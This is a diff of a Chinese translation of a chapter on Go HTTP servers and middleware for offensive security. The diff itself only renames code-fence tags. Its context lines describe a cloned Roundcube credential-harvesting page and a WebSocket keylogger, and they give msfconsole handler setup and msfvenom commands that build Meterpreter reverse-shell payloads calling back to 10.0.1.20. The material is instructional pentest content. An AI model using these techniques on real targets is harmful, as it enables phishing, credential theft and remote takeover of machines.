@@ -43,7 +43,7 @@ func main() {
 实现`http.Handler`接口需要单个方法：``ServeHTTP(http.ResponseWriter, *http.Request)`。这很棒，因为简化了自定义HTTP服务的创建。会发现很多第三方的实现，通过添加特色来扩展`net/http`功能，如中间件，认证，响应编码等等。
 
 可以使用`curl`来测试服务：
-```shell script
+```shell
 $ curl -i http://localhost:8000/hello?name=alice 
 HTTP/1.1 200 OK
 Date: Sun, 12 Jan 2020 01:18:26 GMT 
@@ -91,7 +91,7 @@ func main() {
 首先，定义了没有任何字段名为`router`的类型。用于实现`http.Handler`接口。为此，必须定义` ServeHTTP()`方法。该方法在请求的URL路径上使用一个`switch`语句，基于路径执行不同的逻辑。使用`404 Not Found`响应默认操作。在`main()`中，创建了一个`router`实例，并将指针传给`http.ListenAndServe()`。
 
 在终端里执行下：
-```shell script
+```shell
 $ curl http://localhost:8000/a
 Executing /a
 $ curl http://localhost:8000/d
@@ -140,7 +140,7 @@ func main() {
 如同简单的路由例子，定义了名为`logger`的新类型，但是这次带有一个`Inner`字段，其本身是`http.Handler`。在`ServeHTTP()`定义中，使用`log()`输出请求的开始和结束时间，在这之间调用内部的`ServeHTTP()`方法。对于客户端，请求会在内部的处理器结束。`main()`函数内，使用`http.HandlerFunc()`在函数外面创建了一个`http.Handler`。创建`logger`，给新创建的处理器设置`Inner`。最后，使用`logger`的指针启动服务。
 
 运行代码，然后发送请求就好输出两个本次请求开始和结束时间的信息：
-```shell script
+```shell
 $ go build -o simple_middleware
 $ ./simple_middleware
 2020/01/16 06:23:14 start
@@ -158,7 +158,7 @@ $ ./simple_middleware
 通过几个简单的例子来看下如何使用该路由包。无需运行，因为很快就会在程序中使用它们，但是请随意尝试和试验。
 
 使用`gorilla/mux`之前先安装：
-```shell script
+```shell
 $ go get github.com/gorilla/mux
 ```
 现在可以开始了。使用`mux.NewRouter()`创建路由：
@@ -186,7 +186,7 @@ r.HandleFunc("/users/{user}", func(w http.ResponseWriter, req *http.Request) {
 }).Methods("GET")
 ```
 在路径定义中，使用大括号定义请求参数。可以将其看作一个已命名的占位符。然后，在处理函数内，调用`mux.Vars()`来解析请求体，返回`map[string] string`类型的数据，其值为请求的参数名字和各自的值。使用`user`作关键字。因此，`/users/bob`的请求就会产生对Bob的问候。
-```shell script
+```shell
 $ curl http://localhost:8000/users/bob
 hi bob
 ```
@@ -198,7 +198,7 @@ r.HandleFunc("/users/{user:[a-z]+}", func(w http.ResponseWriter, req *http.Reque
 }).Methods("GET")
 ```
 任何不匹配的模式现在都会返回404响应：
-```shell script
+```shell
 $ curl -i http://localhost:8000/users/bob1 HTTP/1.1
 404 Not Found
 ```
@@ -211,7 +211,7 @@ $ curl -i http://localhost:8000/users/bob1 HTTP/1.1
 例如，可以写个执行基础认证的中间件。能够解析每个请求的认证头，验证用户名和密码，如果凭据无效就返回401响应。还可以以这样的方式将多个中间件函数链接在一起使用，即在执行完一个后再运行下一个。对于本章前面创建的日志中间件，只封装了一个函数。实际上，不是很有用，因为要使用不止一个，为此，必须有可以在一个接一个的链中执行它们的逻辑。从零开始写也并不难，但是不用重复造轮子了。现在已经有成熟的包做到这一点了：`negroni`。
 
 `negroni`，链接为`https://github.com/urfave /negroni/`，非常优秀，因为不是很大的框架。在其他框架中也很容易使用，也非常灵活。还附带了对程序都很有用的默认中间件。在使用之前先获取：
-```shell script
+```shell
 $ go get github.com/urfave/negroni
 ```
 
@@ -249,7 +249,7 @@ n.Use(negroni.NewRecovery())
 接下来，通过调用`n.UseHandler(r)`将路由添加到中间件上。当继续规划和构建中间件时，考虑下执行顺序。例如，认证中间件要在需要认证的处理函数之前执行。在路由之前的中间件要先处理函数之前执行；在路由之后的中间件要在处理函数之后执行。顺序很重要。本例中，还没有定义任何中间件，但很快就会了。
 
 继续编译之前创建的代码4-4，然后运行。然后向服务监听的地址`http://localhost:8000`发送web请求。`negroni`日志中间件就好输出下面的信息。输出带有时间戳，响应码，处理时间，host，和HTTP方法。
-```shell script
+```shell
 $ go build -s negroni_example
 $ ./negroni_example
 [negroni] 2020-01-19T11:49:33-07:00 | 404 | 1.0002ms | localhost:8000 | GET
@@ -335,7 +335,7 @@ func main() {
 `hello()`函数中，通过使用`Context().Value(interface{})`函数从请求上下文中获取username，该函数返回`interface{}`。由于已经知道是个字符串类型，这里就可以对类型强转。如果不能断定类型，或不确定上下文中是否有该值的话，使用`switch`处理。
 
 编译并执行代码4-5，然后发送带有正确和错误凭证的请求。会看到下面的输出：
-```shell script
+```shell
 $ curl -i http://localhost:8000/hello
 HTTP/1.1 401 Unauthorized
 Content-Type: text/plain; charset=utf-8
@@ -420,11 +420,11 @@ $ go build -o template_example $ ./template_example
 首先，需要克隆具有登录表单的站点。这有很多的方法。实际上，更望克隆正在使用的站点。不过，本例克隆Roundcube站点。`Roundcube`是个开源的web邮件客户端，不像商业软件那样常用，例如Microsoft Exchange，但是幸好也能让我们阐明这些概念。使用Docker 来运行 Roundcube，因为会更简单些。
 
 执行下面的命令就能启动自己的Roundcube服务。如果不想运行Roundcube服务也不要担心，实战源代码也有一个站点的克隆。不过，为了完整起见，我们还是加上了这个:
-```shell script
+```shell
 $ docker run --rm -it -p 127.0.0.180:80 robbertkl/roundcube
 ```
 该命令启动了一个Roundcube的Docker实例。如果浏览http://127.0.0.1:80的话，会看到一个登录表单。通常情况下，用`wget`克隆一个站点和所有该站点所需要的文件，但是Roundcube使用的是JavaScript，可以防止这种情况发生。但是，可以使用Google Chrome来保存。在实战目录下，会看到一个文件夹的结构如代码4-7所示：
-```shell script
+```shell
 $ tree
 .
 +-- main.go
@@ -509,7 +509,7 @@ func main() {
  启动服务之前，还要做一件看起来陌生的事情：告诉路由支持文件夹里的静态文件。这样Go服务就好明确地知道静态文件（图像， JavaScript，HTML）的位置。Go简化了这一过程，并提供了针对遍历目录攻击的保护。由里而外，使用`http.Dir(string)`定义希望提供文件的目录。然后将其传入到`http.FileServer(FileSystem)`，这样就为该目录创建了一个`http.Handler`。使用`PathPrefix(string)`将其加到路由上。使用`/`作为路径前缀来匹配任何尚未找到匹配的请求。注意，默认情况下从`FileServer`返回的处理器支持目录索引。这可能会泄露某些信息。当然也可以将其禁用，但是这里先不涉及了。
 
  最后，像之前那样启动服务。构建并执行代码4-8中的代码之后，打开浏览器并浏览`http://localhost:8080`。尝试在表单中提交`username 和 password`。然后回到终端退出程序，查看`credentials.txt`显示如下：
- ```shell script
+ ```shell
 $ go build -o credential_harvester
 $ ./credential_harvester
 ^C
@@ -644,7 +644,7 @@ func main() {
 
 让我们启动服务。如果打开HTML文件，应该会有 `connection established` 的信息。这是日志，因为JavaScript文件被浏览器渲染且请求WebSocket连接。如果在表单元素中键入凭证，在服务中会看到下面的输出。
 
-```shell script
+```shell
 $ go run main.go -listen-addr=127.0.0.1:8080 -ws-addr=127.0.0.1:8080 Connection from 127.0.0.1:58438
 From 127.0.0.1:58438: u
 From 127.0.0.1:58438: s
@@ -677,7 +677,7 @@ From 127.0.0.1:58438: d
 
 这是计划。设置两个单独的Meterpreter反向HTTP侦听器。在本例中个，它们安装在IP地址为10.0.1.20的虚拟机中，但是它们很可能存在于不同的主机上。将监听器分别绑定到10080 到 20080端口。在真实的情况下，这些监听器可以运行在任何地方，只要代理能访问到这些端口。确保已经安装了Metasploit(在Kali Linux上是预先安装了的)；然后启动监听器：
 
-```shell script
+```shell
 $ msfconsole
 > use exploit/multi/handler
 > set payload windows/meterpreter_reverse_http
@@ -693,7 +693,7 @@ $ msfconsole
 
 在第二个Metasploit实例中，执行类似的操作，在端口20080上启动一个额外的监听器。真正唯一不一样的地方是绑定了不同的端口：
 
-```shell script
+```shell
 $ msfconsole
 > use exploit/multi/handler
 > set payload windows/meterpreter_reverse_http > set LHOST 10.0.1.20
@@ -765,14 +765,14 @@ func main() {
 
 至此，已经有了两个正在运行的Meterpreter反向HTTP监听器，现在也应该有一个运行中的反向代理。最后一步是生成测试来检验代理是否工作。使用和Metasploit一起发布的负载生成工具 `msfvenom` ，来生成一对Windows可执行文件:
 
-```shell script
+```shell
 $ msfvenom -p windows/meterpreter_reverse_http LHOST=10.0.1.20 LPORT=80 HttpHostHeader=attacker1.com -f exe -o payload1.exe
 $ msfvenom -p windows/meterpreter_reverse_http LHOST=10.0.1.20 LPORT=80 HttpHostHeader=attacker2.com -f exe -o payload2.exe
 ```
 
 生成了两个文件：*payload1.exe* 和 *payload2.exe 。请注意，除了文件名之外，两者之间的惟一区别是 `HttpHostHeader` 值。这确保产生的负载使用特定的Host报头发送HTTP请求。也要注意，LHOST 和 LPORT 的值对应于反向代理的信息，而不是Meterpreter监听器。将生成的可执行文件传输到Windows系统或虚拟机。当执行该文件时，会有两个新的 sessions 创建：一个绑定在10080端口的监听器，一个是绑定在20080端口的监听器。应该是下面这样：
 
-```shell script
+```shell
 >
 [*] http://10.0.1.20:10080 handling request from 10.0.1.20; (UUID: hff7podk) Redirecting stageless connection from /pxS_2gL43lv34_birNgRHgL4AJ3A9w3i9FXG3Ne2-3UdLhACr8-Qt6QOlOw PTkzww3NEptWTOan2rLo5RT42eOdhYykyPYQy8dq3Bq3Mi2TaAEB with UA 'Mozilla/5.0 (Windows NT 6.1; Trident/7.0;
 rv:11.0) like Gecko'
